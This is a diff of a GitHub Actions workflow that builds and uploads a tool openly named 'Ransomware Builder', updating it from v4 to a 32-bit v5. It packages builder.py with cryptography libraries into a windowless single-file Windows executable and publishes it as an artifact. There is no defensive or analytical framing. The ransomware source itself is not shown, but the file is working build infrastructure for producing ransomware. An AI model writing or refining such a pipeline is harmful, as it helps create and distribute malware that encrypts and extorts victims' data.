@@ -1,4 +1,4 @@
-name: Build Ransomware Builder v4.0
+name: Build Ransomware Builder v5.0 (32-bit)
 
 on:
   push:
@@ -17,15 +17,15 @@ jobs:
       uses: actions/setup-python@v5
       with:
         python-version: '3.11'
+        architecture: 'x86'
         
     - name: Install dependencies
       run: |
         pip install pyinstaller pycryptodome pillow
         
-    - name: Build Builder with ALL dependencies embedded
+    - name: Build Builder (32-bit, optimized)
       run: |
-        # СОБИРАЕМ БИЛДЕР СО ВСЕМИ БИБЛИОТЕКАМИ
-        pyinstaller --onefile --noconsole --name "RansomwareBuilder_v4" `
+        pyinstaller --onefile --noconsole --name "RansomwareBuilder_v5" `
           --hidden-import PyInstaller `
           --hidden-import Crypto `
           --hidden-import Crypto.Cipher `
@@ -33,10 +33,11 @@ jobs:
           --hidden-import Crypto.Util `
           --collect-all Crypto `
           --collect-all pycryptodome `
+          --log-level WARN `
           builder.py
         
     - name: Upload Builder EXE
       uses: actions/upload-artifact@v4
       with:
-        name: RansomwareBuilder_v4
-        path: dist/RansomwareBuilder_v4.exe
+        name: RansomwareBuilder_v5
+        path: dist/RansomwareBuilder_v5.exe
